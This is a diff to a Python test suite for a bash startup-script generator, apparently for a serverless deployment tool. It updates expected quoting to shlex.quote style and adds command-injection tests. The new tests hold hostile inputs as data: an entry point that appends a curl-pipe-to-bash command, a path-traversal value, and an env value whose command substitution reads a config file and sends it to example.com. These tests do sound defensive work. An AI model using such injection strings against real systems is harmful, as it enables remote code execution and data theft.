@@ -74,8 +74,8 @@ exec node app.js
         result = generate_script_content(runtime, entry_point, additional_env)
 
         expected = """#!/bin/bash
-export NODE_ENV="production"
-export PORT="3000"
+export NODE_ENV=production
+export PORT=3000
 
 # Start the application
 exec node server.js
@@ -104,8 +104,8 @@ exec python app.py
         result = generate_script_content(runtime, entry_point, additional_env)
 
         expected = """#!/bin/bash
-export PYTHONPATH="/app"
-export DEBUG="true"
+export PYTHONPATH=/app
+export DEBUG=true
 
 # Start the application
 exec python main.py
@@ -274,10 +274,10 @@ exec node app.js
 
             assert result == 'bootstrap'
 
-            # Verify script content includes environment variables
+            # Verify script content includes environment variables (shlex.quote format)
             written_content = ''.join(call.args[0] for call in mock_file().write.call_args_list)
-            assert 'export NODE_ENV="production"' in written_content
-            assert 'export PORT="8080"' in written_content
+            assert 'export NODE_ENV=production' in written_content
+            assert 'export PORT=8080' in written_content
 
     @pytest.mark.asyncio
     async def test_generate_startup_script_entry_point_not_found(self):
@@ -369,11 +369,11 @@ exec node app.js
 
         result = generate_script_content(runtime, entry_point, additional_env)
 
-        # All values should be wrapped in double quotes
-        assert 'export SIMPLE_VAR="value"' in result
-        assert 'export VAR_WITH_QUOTES="value with "quotes""' in result
-        assert 'export VAR_WITH_SPACES="value with spaces"' in result
-        assert 'export VAR_WITH_SPECIAL="value$with&special*chars"' in result
+        # shlex.quote() wraps simple values without quotes, and complex values in single quotes
+        assert 'export SIMPLE_VAR=value' in result
+        assert 'export VAR_WITH_QUOTES=\'value with "quotes"\'' in result
+        assert "export VAR_WITH_SPACES='value with spaces'" in result
+        assert "export VAR_WITH_SPECIAL='value$with&special*chars'" in result
 
     @pytest.mark.asyncio
     async def test_generate_startup_script_file_write_error(self):
@@ -408,3 +408,156 @@ exec node app.js
         ):
             with pytest.raises(OSError, match='Permission denied'):
                 await generate_startup_script(runtime, entry_point, built_artifacts_path)
+
+    """Security tests for command injection vulnerabilities."""
+
+    @pytest.mark.asyncio
+    async def test_entry_point_command_injection_blocked(self):
+        """Test that entry_point with command injection attempts is rejected."""
+        runtime = 'nodejs18.x'
+        entry_point = 'app.js; curl http://example.com/script.sh | bash'
+        built_artifacts_path = '/dir/artifacts'
+
+        with patch('os.path.exists', return_value=True):
+            with pytest.raises(ValueError, match='Entry point contains invalid characters'):
+                await generate_startup_script(runtime, entry_point, built_artifacts_path)
+
+    @pytest.mark.asyncio
+    async def test_entry_point_path_traversal_blocked(self):
+        """Test that path traversal in entry_point is rejected."""
+        runtime = 'nodejs18.x'
+        entry_point = '../../../system/config'
+        built_artifacts_path = '/dir/artifacts'
+
+        with patch('os.path.exists', return_value=True):
+            with pytest.raises(
+                ValueError,
+                match='(Entry point contains invalid characters|Path traversal detected)',
+            ):
+                await generate_startup_script(runtime, entry_point, built_artifacts_path)
+
+    @pytest.mark.asyncio
+    async def test_env_variable_command_substitution_escaped(self):
+        """Test that command substitution in environment variables is properly escaped."""
+        runtime = 'nodejs18.x'
+        entry_point = 'app.js'
+        built_artifacts_path = '/dir/artifacts'
+        additional_env = {'DB_URL': '$(curl example.com/data?query=$(cat /path/to/config))'}
+
+        mock_file = mock_open()
+        mock_stat_result = MagicMock()
+        mock_stat_result.st_mode = 0o644
+
+        with (
+            patch('os.path.exists', return_value=True),
+            patch('os.path.realpath', side_effect=lambda x: x),
+            patch('builtins.open', mock_file),
+            patch('os.stat', return_value=mock_stat_result),
+            patch('os.chmod'),
+        ):
+            await generate_startup_script(
+                runtime, entry_point, built_artifacts_path, additional_env=additional_env
+            )
+
+            written_content = ''.join(call.args[0] for call in mock_file().write.call_args_list)
+            # Single quotes prevent command substitution in bash
+            assert "'$(curl example.com/data?query=$(cat /path/to/config))'" in written_content
+            # Ensure it's not in double quotes (which would allow execution)
+            assert '"$(curl example.com/data?query=$(cat /path/to/config))"' not in written_content
+
+    @pytest.mark.asyncio
+    async def test_env_variable_invalid_key_rejected(self):
+        """Test that environment variable keys with invalid characters are rejected."""
+        runtime = 'nodejs18.x'
+        entry_point = 'app.js'
+        built_artifacts_path = '/dir/artifacts'
+        additional_env = {
+            'INVALID-KEY': 'value'  # Hyphens not allowed in POSIX env var names
+        }
+
+        with (
+            patch('os.path.exists', return_value=True),
+            patch('os.path.realpath', side_effect=lambda x: x),
+        ):
+            with pytest.raises(
+                ValueError, match='Environment variable key must start with a letter'
+            ):
+                await generate_startup_script(
+                    runtime, entry_point, built_artifacts_path, additional_env=additional_env
+                )
+
+    @pytest.mark.asyncio
+    async def test_env_variable_null_byte_rejected(self):
+        """Test that environment variable values with null bytes are rejected."""
+        runtime = 'nodejs18.x'
+        entry_point = 'app.js'
+        built_artifacts_path = '/dir/artifacts'
+        additional_env = {'DB_URL': 'value\x00malicious'}
+
+        with (
+            patch('os.path.exists', return_value=True),
+            patch('os.path.realpath', side_effect=lambda x: x),
+        ):
+            with pytest.raises(ValueError, match='Environment variable value contains null bytes'):
+                await generate_startup_script(
+                    runtime, entry_point, built_artifacts_path, additional_env=additional_env
+                )
+
+    @pytest.mark.asyncio
+    async def test_valid_entry_point_accepted(self):
+        """Test that valid entry_point values are accepted."""
+        runtime = 'nodejs18.x'
+        entry_points = [
+            'app.js',
+            'src/app.js',
+            'dist/server.js',
+            'app-server.js',
+            'app_server.js',
+            './app.js',
+        ]
+        built_artifacts_path = '/dir/artifacts'
+
+        mock_file = mock_open()
+        mock_stat_result = MagicMock()
+        mock_stat_result.st_mode = 0o644
+
+        for entry_point in entry_points:
+            with (
+                patch('os.path.exists', return_value=True),
+                patch('builtins.open', mock_file),
+                patch('os.stat', return_value=mock_stat_result),
+                patch('os.chmod'),
+                patch('os.path.realpath', side_effect=lambda x: x),
+            ):
+                result = await generate_startup_script(runtime, entry_point, built_artifacts_path)
+                assert result == 'bootstrap'
+
+    @pytest.mark.asyncio
+    async def test_valid_env_variables_accepted(self):
+        """Test that valid environment variables are accepted."""
+        runtime = 'nodejs18.x'
+        entry_point = 'app.js'
+        built_artifacts_path = '/dir/artifacts'
+        additional_env = {
+            'NODE_ENV': 'production',
+            'PORT': '3000',
+            'DB_HOST': 'localhost',
+            '_PRIVATE_VAR': 'value',
+            'VAR123': 'value',
+        }
+
+        mock_file = mock_open()
+        mock_stat_result = MagicMock()
+        mock_stat_result.st_mode = 0o644
+
+        with (
+            patch('os.path.exists', return_value=True),
+            patch('os.path.realpath', side_effect=lambda x: x),
+            patch('builtins.open', mock_file),
+            patch('os.stat', return_value=mock_stat_result),
+            patch('os.chmod'),
+        ):
+            result = await generate_startup_script(
+                runtime, entry_point, built_artifacts_path, additional_env=additional_env
+            )
+            assert result == 'bootstrap'
